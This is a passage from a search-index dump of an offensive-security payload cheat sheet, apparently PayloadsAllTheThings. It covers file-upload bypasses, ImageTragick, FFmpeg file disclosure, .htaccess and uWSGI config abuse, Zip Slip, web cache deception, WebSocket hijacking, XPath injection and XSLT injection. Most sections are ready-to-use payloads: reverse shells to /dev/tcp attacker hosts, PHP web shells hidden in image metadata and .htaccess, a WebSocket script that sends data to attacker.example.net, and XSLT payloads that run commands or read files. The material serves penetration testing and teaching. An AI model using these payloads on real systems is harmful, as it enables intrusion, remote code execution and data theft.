for allowed.</li> </ul> </li> <li>Magic Bytes<ul> <li>Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.<ul> <li>PNG: <code>\\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR\\0\\0\\x03H\\0\\xs0\\x03[</code></li> <li>JPG: <code>\\xff\\xd8\\xff</code></li> <li>GIF: <code>GIF87a</code> OR <code>GIF8;</code></li> </ul> </li> <li>Shell can also be added in the metadata</li> </ul> </li> <li>Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character \":\" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. \"<code>file.asax:.jpg</code>\"). This file might be edited later using other techniques such as using its short filename. The \"::$data\" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. \"<code>file.asp::$data.</code>\")</li> </ul>"},{"location":"Upload%20Insecure%20Files/#filename-vulnerabilities","title":"Filename vulnerabilities","text":"<p>Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.</p> <ul> <li>Time-Based SQLi Payloads: e.g. <code>poc.js'(select*from(select(sleep(20)))a)+'.extension</code></li> <li>LFI/Path Traversal Payloads:  e.g. <code>image.png../../../../../../../etc/passwd</code> </li> <li>XSS Payloads e.g. <code>'\"&gt;&lt;img src=x onerror=alert(document.domain)&gt;.extension</code></li> <li>File Traversal e.g. <code>../../../tmp/lol.png</code></li> <li>Command Injection e.g. <code>; sleep 10;</code></li> </ul> <p>Also you upload: - HTML/SVG files to trigger an XSS - EICAR file to check the presence of an antivirus</p>"},{"location":"Upload%20Insecure%20Files/#picture-compression","title":"Picture Compression","text":"<p>Create valid pictures hosting PHP code. Upload the picture and use a Local File Inclusion to execute the code. The shell can be called with the following command : <code>curl 'http://localhost/test.php?0=system' --data \"1='ls'\"</code>.</p> <ul> <li>Picture Metadata, hide the payload inside a comment tag in the metadata.</li> <li>Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating <code>getimagesize()</code> and <code>imagecreatefromgif()</code>.<ul> <li>JPG: use createBulletproofJPG.py</li> <li>PNG: use createPNGwithPLTE.php</li> <li>GIF: use createGIFwithGlobalColorTable.php</li> </ul> </li> </ul>"},{"location":"Upload%20Insecure%20Files/#picture-with-custom-metadata","title":"Picture with custom metadata","text":"<p>Create a custom picture and insert exif tag with <code>exiftool</code>. A list of multiple exif tags can be found at exiv2.org</p> <pre><code>convert -size 110x110 xc:white payload.jpg\nexiftool -Copyright=\"PayloadsAllTheThings\" -Artist=\"Pentest\" -ImageUniqueID=\"Example\" payload.jpg\nexiftool -Comment=\"&lt;?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg\n</code></pre>"},{"location":"Upload%20Insecure%20Files/#configuration-files","title":"Configuration Files","text":"<p>If you are trying to upload files to a : - PHP server, take a look at the .htaccess trick to execute code. - ASP server, take a look at the web.config trick to execute code. - uWSGI server, take a look at the uwsgi.ini trick to execute code.</p> <p>Configuration files examples - .htaccess - web.config - httpd.conf - __init__.py - uwsgi.ini</p> <p>Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file. - package.json     <pre><code>\"scripts\": {\n\"prepare\" : \"/bin/touch /tmp/pwned.txt\"\n}\n</code></pre> - composer.json     <pre><code>\"scripts\": {\n\"pre-command-run\" : [\n\"/bin/touch /tmp/pwned.txt\"\n]\n}\n</code></pre></p>"},{"location":"Upload%20Insecure%20Files/#cve-image-tragik","title":"CVE - Image Tragik","text":"<p>Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)</p> <pre><code>push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/test.jpg\"|bash -i &gt;&amp; /dev/tcp/attacker-ip/attacker-port 0&gt;&amp;1|touch \"hello)'\npop graphic-context\n</code></pre> <p>More payload in the folder <code>Picture Image Magik</code></p>"},{"location":"Upload%20Insecure%20Files/#cve-ffmpeg","title":"CVE - FFMpeg","text":"<p>FFmpeg HLS vulnerability</p>"},{"location":"Upload%20Insecure%20Files/#zip-archive","title":"ZIP archive","text":"<p>When a ZIP/archive file is automatically decompressed after the upload</p> <ul> <li>Zip Slip: directory traversal to write a file somewhere else     <pre><code>python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15\nln -s ../../../index.php symindex.txt\nzip --symlinks test.zip symindex.txt\n</code></pre></li> </ul>"},{"location":"Upload%20Insecure%20Files/#jetty-rce","title":"Jetty RCE","text":"<p>Upload the XML file to <code>$JETTY_BASE/webapps/</code> * JettyShell.xml - From Mikhail Klyuchnikov</p>"},{"location":"Upload%20Insecure%20Files/#labs","title":"Labs","text":"<ul> <li>Portswigger Labs on File Uploads</li> </ul>"},{"location":"Upload%20Insecure%20Files/#references","title":"References","text":"<ul> <li>Bulletproof Jpegs Generator - Damien \"virtualabs\" Cauquil</li> <li>BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA</li> <li>Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil</li> <li>La PNG qui se prenait pour du PHP, 23 f\u00e9vrier 2014</li> <li>File Upload restrictions bypass - Haboob Team</li> <li>File Upload - Mahmoud M. Awali / @0xAwali</li> <li>IIS - SOAP</li> <li>Arbitrary File Upload Tricks In Java - pyn3rd</li> <li>File Upload - HackTricks</li> <li>Injection points in popular image formats - Daniel Kalinowski\u200c\u200c - Nov 8, 2019</li> <li>A tip for getting RCE in Jetty apps with just one XML file! - Aug 4, 2022 - PT SWARM / @ptswarm</li> <li>Jetty Features for Hacking Web Apps - September 15, 2022 - Mikhail Klyuchnikov</li> <li>Inyecci\u00f3n de c\u00f3digo en im\u00e1genes subidas y tratadas con PHP-GD  - Spanish Resource - hackplayers</li> <li>A New Vector For \u201cDirty\u201d Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella</li> </ul>"},{"location":"Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/","title":"FFmpeg HLS vulnerability","text":"<p>FFmpeg is an open source software used for processing audio and video formats. You can use a malicious HLS playlist inside an AVI video to read arbitrary files.</p>"},{"location":"Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/#exploits","title":"Exploits","text":"<pre><code>1. `./gen_xbin_avi.py file://&lt;filename&gt; file_read.avi`\n2. Upload `file_read.avi` to some website that processes videofiles\n3. (on server side, done by the videoservice) `ffmpeg -i file_read.avi output.mp4`\n4. Click \"Play\" in the videoservice.\n5. If you are lucky, you'll the content of `&lt;filename&gt;` from the server.\n</code></pre>"},{"location":"Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/#how-it-works-explanations-from-neex-hackerone-links","title":"How it works (Explanations from neex - Hackerone links)","text":"<p>the script creates an AVI that contains an HLS playlist inside GAB2. The playlist generated by this script looks like this: <pre><code>#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\nGOD.txt\n#EXTINF:1.0\n/etc/passwd\n#EXT-X-ENDLIST\n</code></pre> To process a playlist ffmpeg concatenates all segments and processes it as single file. To determine the type of this file FFmpeg uses the first segment of the playlist. FFmpeg processes .txt files in a special way. It tries to show a screen capture of a tty printing this file.    </p> <p>So, the playlist above will be processed as follows: FFmpeg sees #EXTM3U signature inside GAB2 chunk and determines file type as HLS playlist. The file GOD.txt doesn't even exist, but it's name is enough for FFmpeg to detect file type as .txt. FFmpeg concatenates the contents of all segments of the playlist. As only one of two segments actually exists, the result of concatenation is just the contents of the file we want to retrieve. Because the type of this concatenation is .txt, FFmpeg draws a tty that prints the file.</p>"},{"location":"Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/#thanks-to","title":"Thanks to","text":"<ul> <li>Hackerone - Local File Disclosure via ffmpeg @sxcurity</li> <li>Hackerone - Another local file disclosure via ffmpeg</li> <li>PHDays - Attacks on video converters:a year later, Emil Lerner, Pavel Cheremushkin</li> <li>Script by @neex</li> </ul>"},{"location":"Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/","title":".htaccess upload","text":"<p>Uploading an .htaccess file to override Apache rule and execute PHP. \"Hackers can also use \u201c.htaccess\u201d file tricks to upload a malicious file with any extension and execute it. For a simple example, imagine uploading to the vulnerabler server an .htaccess file that has AddType application/x-httpd-php .htaccess configuration and also contains PHP shellcode. Because of the malicious .htaccess file, the web server considers the .htaccess file as an executable php file and executes its malicious PHP shellcode. One thing to note: .htaccess configurations are applicable only for the same directory and sub-directories where the .htaccess file is uploaded.\"</p> <p>Self contained .htaccess web shell</p> <pre><code># Self contained .htaccess web shell - Part of the htshell project\n# Written by Wireghoul - http://www.justanotherhacker.com\n# Override default deny rule to make .htaccess file accessible over web\n&lt;Files ~ \"^\\.ht\"&gt;\nOrder allow,deny\nAllow from all\n&lt;/Files&gt;\n# Make .htaccess file be interpreted as php file. This occur after apache has interpreted\n# the apache directoves from the .htaccess file\nAddType application/x-httpd-php .htaccess\n</code></pre> <pre><code>###### SHELL ######\n&lt;?php echo \"\\n\";passthru($_GET['c'].\" 2&gt;&amp;1\"); ?&gt;\n</code></pre>"},{"location":"Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/#htaccess-simple-php","title":".htaccess simple php","text":"<p>Upload an .htaccess with : <code>AddType application/x-httpd-php .rce</code>  Then upload any file with <code>.rce</code> extension.</p>"},{"location":"Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/#htaccess-upload-as-image","title":".htaccess upload as image","text":"<p>If the <code>exif_imagetype</code> function is used on the server side to determine the image type, create a <code>.htaccess/image</code> polyglot. </p> <p>Supported image types include X BitMap (XBM) and WBMP. In <code>.htaccess</code> ignoring lines starting with <code>\\x00</code> and <code>#</code>, you can use these scripts for generate a valid <code>.htaccess/image</code> polyglot.</p> <p><pre><code># create valid .htaccess/xbm image\nwidth = 50\nheight = 50\npayload = '# .htaccess file'\nwith open('.htaccess', 'w') as htaccess:\nhtaccess.write('#define test_width %d\\n' % (width, ))\nhtaccess.write('#define test_height %d\\n' % (height, ))\nhtaccess.write(payload)\n</code></pre> or <pre><code># create valid .htaccess/wbmp image\ntype_header = b'\\x00'\nfixed_header = b'\\x00'\nwidth = b'50'\nheight = b'50'\npayload = b'# .htaccess file'\nwith open('.htaccess', 'wb') as htaccess:\nhtaccess.write(type_header + fixed_header + width + height)\nhtaccess.write(b'\\n')\nhtaccess.write(payload)\n</code></pre></p>"},{"location":"Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/#thanks-to","title":"Thanks to","text":"<ul> <li>ATTACKING WEBSERVERS VIA .HTACCESS - By Eldar Marcussen</li> <li>Protection from Unrestricted File Upload Vulnerability</li> <li>Writeup to l33t-hoster task, Insomnihack Teaser 2019</li> </ul>"},{"location":"Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/","title":"Index","text":"<p>If you have upload access to a non /cgi-bin folder - upload a httpd.conf and configure your own interpreter.</p> <p>Details from Busybox httpd.c</p> <p>https://github.com/brgl/busybox/blob/abbf17abccbf832365d9acf1c280369ba7d5f8b2/networking/httpd.c#L60</p> <p>*.php:/path/php   # run xxx.php through an interpreter`</p> <p>If a sub directory contains config file, it is parsed and merged with any existing settings as if it was appended to the original configuration.</p> <p>Watch out for Windows CRLF line endings messing up your payload (you will just get 404 errors) - you cant see these in Burp :)  </p>"},{"location":"Upload%20Insecure%20Files/Configuration%20uwsgi.ini/","title":"uWSGI configuration file","text":"<p>uWSGI configuration files can include \u201cmagic\u201d variables, placeholders and operators defined with a precise syntax. The \u2018@\u2019 operator in particular is used in the form of @(filename) to include the contents of a file. Many uWSGI schemes are supported, including \u201cexec\u201d - useful to read from a process\u2019s standard output. These operators can be weaponized for Remote Command Execution or Arbitrary File Write/Read when a .ini configuration file is parsed:</p> <p>Example of malicious uwsgi.ini file:</p> <pre><code>[uwsgi]\n; read from a symbol\nfoo = @(sym://uwsgi_funny_function)\n; read from binary appended data\nbar = @(data://[REDACTED])\n; read from http\ntest = @(http://[REDACTED])\n; read from a file descriptor\ncontent = @(fd://[REDACTED])\n; read from a process stdout\nbody = @(exec://whoami)\n; call a function returning a char *\ncharacters = @(call://uwsgi_func)\n</code></pre> <p>When the configuration file will be parsed(e.g. restart, crash or autoreload) payload will be executed.</p>"},{"location":"Upload%20Insecure%20Files/Configuration%20uwsgi.ini/#uwsgi-lax-parsing","title":"uWSGI lax parsing","text":"<p>The uWSGI parsing of configuration file is lax. The previous payload can be embedded inside a binary file(e.g. image, pdf, ...). </p>"},{"location":"Upload%20Insecure%20Files/Configuration%20uwsgi.ini/#thanks-to","title":"Thanks to","text":"<ul> <li>A New Vector For \u201cDirty\u201d Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella</li> </ul>"},{"location":"Upload%20Insecure%20Files/Extension%20Flash/","title":"Index","text":""},{"location":"Upload%20Insecure%20Files/Extension%20Flash/#xss-via-swf","title":"XSS via SWF","text":"<p>As you may already know, it is possible to make a website vulnerable to XSS if you can upload/include a SWF file into that website. I am going to represent this SWF file that you can use in your PoCs. This method is based on [1] and [2], and it has been tested in Google Chrome, Mozilla Firefox, IE9/8; there should not be any problem with other browsers either.</p> <pre><code>Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);\nIE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(\u2018?js=history.go(-1)\u2019,\u2019_self\u2019);}\nIE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(\u2018invalidfileinvalidfileinvalidfile\u2019,\u2019target\u2019);setTimeout(\u2018alert(w.document.location);w.close();\u2019,1);\n</code></pre>"},{"location":"Upload%20Insecure%20Files/Picture%20Image%20Magik/","title":"Image Tragik 1 &amp; 2","text":""},{"location":"Upload%20Insecure%20Files/Picture%20Image%20Magik/#exploit-v1","title":"Exploit v1","text":"<p>Simple reverse shell</p> <pre><code>push graphic-context\nencoding \"UTF-8\"\nviewbox 0 0 1 1\naffine 1 0 0 1 0 0\npush graphic-context\nimage Over 0,0 1,1 '|/bin/sh -i &gt; /dev/tcp/ip/80 0&lt;&amp;1 2&gt;&amp;1'\npop graphic-context\npop graphic-context\n</code></pre>"},{"location":"Upload%20Insecure%20Files/Picture%20Image%20Magik/#exploit-v2","title":"Exploit v2","text":"<p>Simple <code>id</code> payload</p> <pre><code>%!PS\nuserdict /setpagedevice undef\nsave\nlegal\n{ null restore } stopped { pop } if\n{ legal } stopped { pop } if\nrestore\nmark /OutputFile (%pipe%id) currentdevice putdeviceprops\n</code></pre> <p>then use <code>convert shellexec.jpeg whatever.gif</code></p>"},{"location":"Upload%20Insecure%20Files/Picture%20Image%20Magik/#thanks-to","title":"Thanks to","text":"<ul> <li>openwall.com/lists/oss-security/2018/08/21/2 by Tavis Ormandy</li> </ul>"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/","title":"Zip Slip","text":"<p>The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../shell.php). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim\u2019s machine. </p>"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#summary","title":"Summary","text":"<ul> <li>Detection</li> <li>Tools</li> <li>Exploits</li> <li>Basic Exploit</li> <li>Additional Notes</li> </ul>"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#detection","title":"Detection","text":"<ul> <li>Any zip upload page on the application</li> </ul>"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#tools","title":"Tools","text":"<ul> <li>evilarc</li> <li>slipit</li> </ul>"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#exploits","title":"Exploits","text":""},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#basic-exploit","title":"Basic Exploit","text":"<p>Using evilarc: <pre><code>python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15\n</code></pre></p>"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#additional-notes","title":"Additional Notes","text":"<ul> <li>For affected libraries and projects, visit https://github.com/snyk/zip-slip-vulnerability</li> </ul>"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#references","title":"References","text":"<ul> <li>Zip Slip Vulnerability - Snyk Ltd, 2019</li> <li>Zip Slip - snyk, 2019</li> </ul>"},{"location":"Web%20Cache%20Deception/","title":"Web Cache Deception","text":""},{"location":"Web%20Cache%20Deception/#tools","title":"Tools","text":"<ul> <li>Param Miner - PortSwigger     &gt; This extension identifies hidden, unlinked parameters. It's particularly useful for finding web cache poisoning vulnerabilities.</li> </ul>"},{"location":"Web%20Cache%20Deception/#exploit","title":"Exploit","text":"<ol> <li>Browser requests <code>http://www.example.com/home.php/non-existent.css</code>.</li> <li>Server returns the content of <code>http://www.example.com/home.php</code>, most probably with HTTP caching headers that instruct to not cache this page.</li> <li>The response goes through the proxy.</li> <li>The proxy identifies that the file has a css extension.</li> <li>Under the cache directory, the proxy creates a directory named home.php, and caches the imposter \"CSS\" file (non-existent.css) inside.</li> </ol>"},{"location":"Web%20Cache%20Deception/#methodology-of-the-attack-example","title":"Methodology of the attack - example","text":"<ol> <li>Normal browsing, visit home : <code>https://www.example.com/myaccount/home/</code></li> <li>Open the malicious link : <code>https://www.example.com/myaccount/home/malicious.css</code></li> <li>The page is displayed as /home and the cache is saving the page</li> <li>Open a private tab with the previous URL : <code>https://www.paypal.com/myaccount/home/malicous.css</code></li> <li>The content of the cache is displayed</li> </ol> <p>Video of the attack by Omer Gil - Web Cache Deception Attack in PayPal Home Page </p>"},{"location":"Web%20Cache%20Deception/#methodology-2","title":"Methodology 2","text":"<ol> <li>Find an un-keyed input for a Cache Poisoning     <pre><code>Values: User-Agent\nValues: Cookie\nHeader: X-Forwarded-Host\nHeader: X-Host\nHeader: X-Forwarded-Server\nHeader: X-Forwarded-Scheme (header; also in combination with X-Forwarded-Host)\nHeader: X-Original-URL (Symfony)\nHeader: X-Rewrite-URL (Symfony)\n</code></pre></li> <li>Cache poisoning attack - Example for <code>X-Forwarded-Host</code> un-keyed input (remember to use a buster to only cache this webpage instead of the main page of the website)     <pre><code>GET /test?buster=123 HTTP/1.1\nHost: target.com\nX-Forwarded-Host: test\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\nHTTP/1.1 200 OK\nCache-Control: public, no-cache\n[..]\n&lt;meta property=\"og:image\" content=\"https://test\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;\n</code></pre></li> </ol>"},{"location":"Web%20Cache%20Deception/#labs","title":"Labs","text":"<ul> <li>PortSwigger Labs for Web cache deception</li> </ul>"},{"location":"Web%20Cache%20Deception/#references","title":"References","text":"<ul> <li>Web Cache Deception Attack - Omer Gil</li> <li>Practical Web Cache Poisoning - James Kettle @albinowax</li> <li>Web Cache Entanglement: Novel Pathways to Poisoning - James Kettle @albinowax</li> <li>Web Cache Deception Attack leads to user info disclosure - Kunal pandey - Feb 25</li> <li>Web cache poisoning - Web Security Academy learning materials</li> <li>Exploiting cache design flaws</li> <li>Exploiting cache implementation flaws</li> </ul>"},{"location":"Web%20Sockets/","title":"Web Sockets","text":"<p>The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server</p>"},{"location":"Web%20Sockets/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploit</li> <li>Using ws-harness.py</li> <li>Cross-Site WebSocket Hijacking (CSWSH)</li> <li>Labs</li> <li>References</li> </ul>"},{"location":"Web%20Sockets/#tools","title":"Tools","text":"<ul> <li>ws-harness.py</li> </ul>"},{"location":"Web%20Sockets/#exploit","title":"Exploit","text":""},{"location":"Web%20Sockets/#using-ws-harnesspy","title":"Using ws-harness.py","text":"<p>Start ws-harness to listen on a web-socket, and specify a message template to send to the endpoint.</p> <pre><code>python ws-harness.py -u \"ws://dvws.local:8080/authenticate-user\" -m ./message.txt\n</code></pre> <p>The content of the message should contains the [FUZZ] keyword.</p> <pre><code>{\"auth_user\":\"dGVzda==\", \"auth_pass\":\"[FUZZ]\"}\n</code></pre> <p>Then you can use any tools against the newly created web service, working as a proxy and tampering on the fly the content of message sent thru the websocket.</p> <pre><code>sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump\n</code></pre>"},{"location":"Web%20Sockets/#cross-site-websocket-hijacking-cswsh","title":"Cross-Site WebSocket Hijacking (CSWSH)","text":"<p>If the WebSocket handshake is not correctly protected using a CSRF token or a nonce, it's possible to use the authenticated WebSocket of a user on an attacker's controlled site because the cookies are automatically sent by the browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH).</p> <p>Example exploit, hosted on an attacker's server, that exfiltrates the received data from the WebSocket to the attacker:</p> <pre><code>&lt;script&gt;\nws = new WebSocket('wss://vulnerable.example.com/messages');\nws.onopen = function start(event) {\nws.send(\"HELLO\");\n}\nws.onmessage = function handleReply(event) {\nfetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});\n}\nws.send(\"Some text sent to the server\");\n&lt;/script&gt;\n</code></pre> <p>You have to adjust the code to your exact situation. E.g. if your web application uses a <code>Sec-WebSocket-Protocol</code> header in the handshake request, you have to add this value as a 2nd parameter to the <code>WebSocket</code> function call in order to add this header.</p>"},{"location":"Web%20Sockets/#labs","title":"Labs","text":"<ul> <li>PortSwigger Labs for Web Sockets</li> </ul>"},{"location":"Web%20Sockets/#references","title":"References","text":"<ul> <li>HACKING WEB SOCKETS: ALL WEB PENTEST TOOLS WELCOMED by Michael Fowl | Mar 5, 2019</li> <li>Hacking with WebSockets - Qualys - Mike Shema, Sergey Shekyan, Vaagn Toukharian</li> <li>Mini WebSocket CTF - January 27, 2020 - Snowscan</li> <li>Hacktricks - CSWSH</li> </ul>"},{"location":"XPATH%20Injection/","title":"XPATH Injection","text":"<p>XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.</p>"},{"location":"XPATH%20Injection/#summary","title":"Summary","text":"<ul> <li>Exploitation</li> <li>Blind exploitation</li> <li>Out Of Band Exploitation</li> <li>Tools</li> <li>References</li> </ul>"},{"location":"XPATH%20Injection/#exploitation","title":"Exploitation","text":"<p>Similar to SQL : <code>\"string(//user[name/text()='\" +vuln_var1+ \"' and password/text()=\u2019\" +vuln_var1+ \"']/account/text())\"</code></p> <pre><code>' or '1'='1\n' or ''='\nx' or 1=1 or 'x'='y\n/\n//\n//*\n*/*\n@*\ncount(/child::node())\nx' or name()='username' or 'x'='y\n' and count(/*)=1 and '1'='1\n' and count(/@*)=1 and '1'='1\n' and count(/comment())=1 and '1'='1\nsearch=')] | //user/*[contains(*,'\nsearch=Har') and contains(../password,'c\nsearch=Har') and starts-with(../password,'c\n</code></pre>"},{"location":"XPATH%20Injection/#blind-exploitation","title":"Blind Exploitation","text":"<ol> <li>Size of a string     <pre><code>and string-length(account)=SIZE_INT\n</code></pre></li> <li>Extract a character     <pre><code>substring(//user[userid=5]/username,2,1)=CHAR_HERE\nsubstring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)\n</code></pre></li> </ol>"},{"location":"XPATH%20Injection/#out-of-band-exploitation","title":"Out Of Band Exploitation","text":"<pre><code>http://example.com/?title=Foundation&amp;type=*&amp;rent_days=* and doc('//10.10.10.10/SHARE')\n</code></pre>"},{"location":"XPATH%20Injection/#tools","title":"Tools","text":"<ul> <li>xcat - Automate XPath injection attacks to retrieve documents</li> <li>xxxpwn - Advanced XPath Injection Tool </li> <li>xxxpwn_smart - A fork of xxxpwn using predictive text </li> <li>xpath-blind-explorer</li> <li>XmlChor - Xpath injection exploitation tool</li> </ul>"},{"location":"XPATH%20Injection/#references","title":"References","text":"<ul> <li>OWASP XPATH Injection</li> <li>Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017</li> </ul>"},{"location":"XSLT%20Injection/","title":"XSLT Injection","text":"<p>Processing an un-validated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code</p>"},{"location":"XSLT%20Injection/#summary","title":"Summary","text":"<ul> <li>XSLT Injection</li> <li>Summary</li> <li>Tools</li> <li>Exploit<ul> <li>Determine the vendor and version</li> <li>External Entity</li> <li>Read files and SSRF using document</li> <li>Remote Code Execution with Embedded Script Blocks</li> <li>Remote Code Execution with PHP wrapper</li> <li>Remote Code Execution with Java</li> <li>Remote Code Execution with Native .NET</li> </ul> </li> <li>References</li> </ul>"},{"location":"XSLT%20Injection/#tools","title":"Tools","text":""},{"location":"XSLT%20Injection/#exploit","title":"Exploit","text":""},{"location":"XSLT%20Injection/#determine-the-vendor-and-version","title":"Determine the vendor and version","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;\n&lt;xsl:template match=\"/fruits\"&gt;\n&lt;xsl:value-of select=\"system-property('xsl:vendor')\"/&gt;\n&lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"&gt;\n&lt;body&gt;\n&lt;br /&gt;Version: &lt;xsl:value-of select=\"system-property('xsl:version')\" /&gt;\n&lt;br /&gt;Vendor: &lt;xsl:value-of select=\"system-property('xsl:vendor')\" /&gt;\n&lt;br /&gt;Vendor URL: &lt;xsl:value-of select=\"system-property('xsl:vendor-url')\" /&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"XSLT%20Injection/#external-entity","title":"External Entity","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM \"C:\\secretfruit.txt\"&gt;]&gt;\n&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;\n&lt;xsl:template match=\"/fruits\"&gt;\nFruits &amp;ext_file;:\n    &lt;!-- Loop for each fruit --&gt;\n&lt;xsl:for-each select=\"fruit\"&gt;\n&lt;!-- Print name: description --&gt;\n- &lt;xsl:value-of select=\"name\"/&gt;: &lt;xsl:value-of select=\"description\"/&gt;\n&lt;/xsl:for-each&gt;\n&lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre>"},{"location":"XSLT%20Injection/#read-files-and-ssrf-using-document","title":"Read files and SSRF using document","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;\n&lt;xsl:template match=\"/fruits\"&gt;\n&lt;xsl:copy-of select=\"document('http://172.16.132.1:25')\"/&gt;\n&lt;xsl:copy-of select=\"document('/etc/passwd')\"/&gt;\n&lt;xsl:copy-of select=\"document('file:///c:/winnt/win.ini')\"/&gt;\nFruits:\n        &lt;!-- Loop for each fruit --&gt;\n&lt;xsl:for-each select=\"fruit\"&gt;\n&lt;!-- Print name: description --&gt;\n- &lt;xsl:value-of select=\"name\"/&gt;: &lt;xsl:value-of select=\"description\"/&gt;\n&lt;/xsl:for-each&gt;\n&lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre>"},{"location":"XSLT%20Injection/#remote-code-execution-with-embedded-script-blocks","title":"Remote Code Execution with Embedded Script Blocks","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\nxmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\nxmlns:user=\"urn:my-scripts\"&gt;\n&lt;msxsl:script language = \"C#\" implements-prefix = \"user\"&gt;\n&lt;![CDATA[\npublic string execute(){\nSystem.Diagnostics.Process proc = new System.Diagnostics.Process();\nproc.StartInfo.FileName= \"C:\\\\windows\\\\system32\\\\cmd.exe\";\nproc.StartInfo.RedirectStandardOutput = true;\nproc.StartInfo.UseShellExecute = false;\nproc.StartInfo.Arguments = \"/c dir\";\nproc.Start();\nproc.WaitForExit();\nreturn proc.StandardOutput.ReadToEnd();\n}\n]]&gt;\n&lt;/msxsl:script&gt;\n&lt;xsl:template match=\"/fruits\"&gt;\n--- BEGIN COMMAND OUTPUT ---\n    &lt;xsl:value-of select=\"user:execute()\"/&gt;\n--- END COMMAND OUTPUT ---    &lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre>"},{"location":"XSLT%20Injection/#remote-code-execution-with-php-wrapper","title":"Remote Code Execution with PHP wrapper","text":"<p>Execute the function <code>readfile</code>.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"&gt;\n&lt;body&gt;\n&lt;xsl:value-of select=\"php:function('readfile','index.php')\" /&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Execute the function <code>scandir</code>.</p> <pre><code>&lt;xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\"&gt;\n&lt;xsl:template match=\"/\"&gt;\n&lt;xsl:value-of name=\"assert\" select=\"php:function('scandir', 